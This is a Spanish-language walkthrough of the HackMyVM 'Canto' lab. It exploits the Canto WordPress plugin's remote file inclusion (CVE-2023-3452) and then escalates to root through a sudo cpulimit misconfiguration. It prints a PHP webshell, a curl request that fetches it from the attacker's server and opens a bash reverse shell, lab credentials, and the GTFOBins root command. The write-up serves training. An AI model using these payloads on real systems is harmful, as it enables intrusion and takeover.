---
Estado: Completado
Plataforma: HackMyVM
SO: Linux
Dificultad: Facil
VectorInicial: Vulnerable WordPress Plugin (Canto - CVE-2023-3452)
ServicioInicial: HTTP
PuertoInicial: 80
Credenciales:
 - erik: th1sIsTheP3ssw0rd!
Usuarios:
 - www-data
 - erik
 - root
Privesc:
 - Sudo misconfiguration (cpulimit)
 - GTFOBins abuse
Tecnicas:
 - WordPress Enumeration
 - Plugin Enumeration (Custom Wordlist)
 - Remote File Inclusion (RFI)
 - Remote Code Execution (RCE)
 - Reverse Shell
 - Credential Discovery
 - Lateral Movement
 - Sudo Privilege Escalation
Herramientas:
 - arp-scan
 - gomap
 - gobuster
 - wpscan
 - curl
 - python3 http.server
 - penelope
Fecha: 2026-04-01
---
<img width="352" height="503" alt="Pasted image 20260401092842" src="https://github.com/user-attachments/assets/14722750-db0d-4cc5-921a-3184ab0c440b" />

Lo que primero tendremos que realizar sera un descubrimiento de red para encontrar la maquina objetivo.

```bash
 sudo arp-scan -I eth0 --localnet                                  
Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.11.2	08:00:27:51:0d:8d	(Unknown)
10.0.11.1	52:55:0a:00:0b:01	(Unknown: locally administered)
10.0.11.19	08:00:27:5a:76:65	(Unknown)

10 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.924 seconds (133.06 hosts/sec). 3 responded
```

Como podemos observar la IP es `10.0.11.19` así que empecemos con una enumeración de puertos de la maquina.

```bash
 settarget 10.0.11.19            
TARGET establecido: 10.0.11.19

 gomap -s $TARGET                                                                                                 

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 10.0.11.19 (996 ports, CONNECT scan)

PORT    STATE  SERVICE         VERSION
22      open   ssh             SSH-2.0 - OpenSSH 9.3p1 Ubuntu-1ubuntu3.3
80      open   http            Apache 2.4.57 (Ubuntu)

Host Exposure Summary
- 10.0.11.19 | open ports: 2 | critical: ssh | exposure: medium

✓ Completed scan in 740ms | hosts: 1 | open ports: 2
```

Solo encontramos 2 puertos abiertos, de los cuales son:
- 22 para conexión por `ssh`
- 80 para conexión `http` y servicio web

Veamos que tenemos en la web.

<img width="1316" height="359" alt="Pasted image 20260401094829" src="https://github.com/user-attachments/assets/a150fbb6-91d4-474f-a627-69ec0dcc89dd" />

A primera vista parece una web muy simple y sin sentido ademas de parecer estática, pero si miramos el código pulsando `CTRL+U` vemos algo muy diferente.

```html
<meta name="generator" content="WordPress 6.9.4" />
<script type="importmap" id="wp-importmap">
```

Nos encontramos ante un **Wordpress** y por consiguiente nos da un punto de partida, veamos que encontramos.

```bash
 wpscan --url http://$TARGET -e u,p --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.0.11.19/ [10.0.11.19]
[+] Started: Wed Apr  1 09:54:49 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 
 <skip>
 
 [i] User(s) Identified:

[+] erik
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.0.11.19/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Finished: Wed Apr  1 09:54:54 2026
[+] Requests Done: 1520
[+] Cached Requests: 50
[+] Data Sent: 408.92 KB
[+] Data Received: 225.575 KB
[+] Memory used: 243.359 MB
[+] Elapsed time: 00:00:04
```

No se han encontrado `plugins` vulnerables, pero si hemos encontrado un usuario, así que vamos a probar si este usuario tiene una contraseña débil.

Al no encontrar nada ni con `wpscan` ni `hydra` atacando el puerto **ssh** es posible que nos encontremos con algo oculto, así que vamos a enumerar completamente `Wordpress` a ver si damos con algo.

```bash
 gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt,js 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.11.19/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,js,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 301) [Size: 0] [--> http://10.0.11.19/]
wp-content           (Status: 301) [Size: 313] [--> http://10.0.11.19/wp-content/]
wp-login.php         (Status: 200) [Size: 5324]
license.txt          (Status: 200) [Size: 19903]
wp-includes          (Status: 301) [Size: 314] [--> http://10.0.11.19/wp-includes/]
readme.html          (Status: 200) [Size: 7425]
wp-trackback.php     (Status: 200) [Size: 135]
wp-admin             (Status: 301) [Size: 311] [--> http://10.0.11.19/wp-admin/]
xmlrpc.php           (Status: 405) [Size: 42]
wp-signup.php        (Status: 302) [Size: 0] [--> http://10.0.11.19/wp-login.php?action=register]
server-status        (Status: 403) [Size: 275]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================

 gobuster dir -u http://$TARGET/wp-content/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt,js
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.11.19/wp-content/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 0]
themes               (Status: 301) [Size: 320] [--> http://10.0.11.19/wp-content/themes/]
uploads              (Status: 301) [Size: 321] [--> http://10.0.11.19/wp-content/uploads/]
plugins              (Status: 301) [Size: 321] [--> http://10.0.11.19/wp-content/plugins/]
upgrade              (Status: 301) [Size: 321] [--> http://10.0.11.19/wp-content/upgrade/]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```

Como la mayoría de listas que trae por defecto el sistema, ya se Kali o Parrot, incluso `seclist` no detectan todos los plugins opte por crearme una yo mismo, busque en **GitHub** varias listas y las combine para hacer un diccionario mas grande, casi 100.000 entradas.

```bash
 gobuster dir -u http://$TARGET/wp-content/plugins/ -w wp-plugins-final.txt -x html,php,txt,js 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.11.19/wp-content/plugins/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                wp-plugins-final.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
akismet              (Status: 301) [Size: 329] [--> http://10.0.11.19/wp-content/plugins/akismet/]
canto                (Status: 301) [Size: 327] [--> http://10.0.11.19/wp-content/plugins/canto/]
Progress: 493790 / 493790 (100.00%)
===============================================================
Finished
===============================================================
```

Ahora si hemos encontrado el `plugin` en cuestión de esta maquina.

Ahora veamos su versión y que vulnerabilidad podemos usar.

```http
http://10.0.11.19/wp-content/plugins/canto/readme.txt
```

En este fichero obtenemos mucha información, pero ahora mismo solo nos interesa la cabecera.

```txt
=== Canto ===
Contributors: Canto Inc, ianthekid, flightjim
Tags: digital asset management, brand management, cloud storage, DAM, file storage, image management, photo library, Canto
Requires at least: 5.0
Tested up to: 6.1
Stable tag: 3.0.4
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html
```

Veamos si encontramos alguna vulnerabilidad para esta versión.

```http
https://www.exploit-db.com/exploits/51826
```

Parece que esta versión tienen la vulnerabilidad `CVE-2023-3452` relativa a un `RFI` y un `RCE`.

Vamos por partes ya que lo haremos de manera manual en lugar de usar los exploits.

Primero crearemos un fichero con código **php** para generar un `webshell`.

```bash
 mkdir wp-admin
 echo '<?php system($_GET["cmd"]); ?>' > wp-admin/admin.php
```

Esto lo hacemos así puesto que la petición la realizara mediante esa dirección, así que en la carpeta en la que estamos, antes de `wp-admin` lanzaremos un servidor web, en `python` por ejemplo.

```bash
 python3 -m http.server 8000
```

Al mismo tiempo que esta el servidor web corriendo vamos a ponernos a la escucha para recibir la `revershell`.

```bash
 penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.11.11 • 172.17.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Con todo listo solo tenemos que realizar la petición y obtendremos lo que buscamos.

```bash
 curl -G "http://$TARGET/wp-content/plugins/canto/includes/lib/download.php" \
  --data-urlencode "wp_abspath=http://10.0.11.11:8000" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.0.11.11/4444 0>&1'"
```

Si nos fijamos en el servidor web que hemos montado veremos que nos ha llegado la petición.

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.0.11.19 - - [01/Apr/2026 12:46:53] "GET /wp-admin/admin.php HTTP/1.1" 200 -
10.0.11.19 - - [01/Apr/2026 12:48:26] "GET /wp-admin/admin.php HTTP/1.1" 200 -
```

Al mismo tiempo tenemos la conexión con la maquina desde `penelope`.

```bash
www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$ ls
class-canto-admin-api.php   class-canto-media.php  detail.php	get.php	  sizes.php
class-canto-attachment.php  copy-media.php	  download.php  media-upload.php  tree.php
www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$ 
```

Ahora nos pondremos manos a la obra para localizar los ficheros que solicita este laboratorio, usuario y root.

Lo primero que miramos es el fichero `wp-config.php` en busca de credenciales.

```php

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', '2NCVjoWVE9iwxPz' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
```

Ademas tenemos algo curioso al investigar al usuario `erik`.

```bash
www-data@canto:/var/www/html$ cd /home/erik/
www-data@canto:/home/erik$ ls
notes  user.txt
www-data@canto:/home/erik$ cat user.txt 
cat: user.txt: Permission denied
www-data@canto:/home/erik$ ls notes/
Day1.txt  Day2.txt
www-data@canto:/home/erik$ cat notes/Day1.txt 
On the first day I have updated some plugins and the website theme.
www-data@canto:/home/erik$ cat notes/Day2.txt 
I almost lost the database with my user so I created a backups folder.
www-data@canto:/home/erik$ 
```

Hay un **backup** de la base de datos, toca buscar.

```bash
www-data@canto:/home/erik$ find / -name 'wordpress' 2>/dev/null 
/var/www/html/wp-includes/js/tinymce/plugins/wordpress
/var/www/html/wp-includes/js/tinymce/skins/wordpress
/var/wordpress
www-data@canto:/home/erik$ cd /var/wordpress/
www-data@canto:/var/wordpress$ ls
backups
www-data@canto:/var/wordpress$ cd backups
www-data@canto:/var/wordpress/backups$ ls
12052024.txt
www-data@canto:/var/wordpress/backups$ cat 12052024.txt 
------------------------------------
| Users	   |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------
www-data@canto:/var/wordpress/backups$ 
```

Tenemos ganador y ya no tenemos que usar los datos que teníamos para investigar la base de datos, con esto ya tenemos un contraseña para ver si podemos cambiarnos al usuario `erik`.

```bash
www-data@canto:/var/wordpress/backups$ su erik
Password: 
erik@canto:/var/wordpress/backups$ 
```

Perfecto, ahora solo tenemos que ver la flag en el `home` de `erik` y ver que podemos hacer para ser **root**.

```bash
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
```

Pues obtenemos un indicio a la primera, ahora a buscar en [GTFOBins](https://gtfobins.org/gtfobins/cpulimit/#shell) para ver si podemos aprovechar este binario.

```bash
erik@canto:~$ sudo -u root cpulimit -l 100 -f /bin/sh
Process 3219 detected
# whoami
root
# /bin/bash
root@canto:/home/erik# cd /root/
root@canto:~# ls
root.txt  snap
root@canto:~#
```

Bien pues con esto ya tenemos todo el laboratorio completo.

Como hemos podido ver en este laboratorio podemos mediante enumeración dar con hallazgos interesantes aunque a primera vista solo tengamos una web estática.

Posteriormente explotamos una vulnerabilidad de forma manual en lugar de usar los exploits públicos para el `CVE-2023-3452`.

Por último realizamos un `pivoting` de usuarios para finalmente llegar a comprometer el `root`.
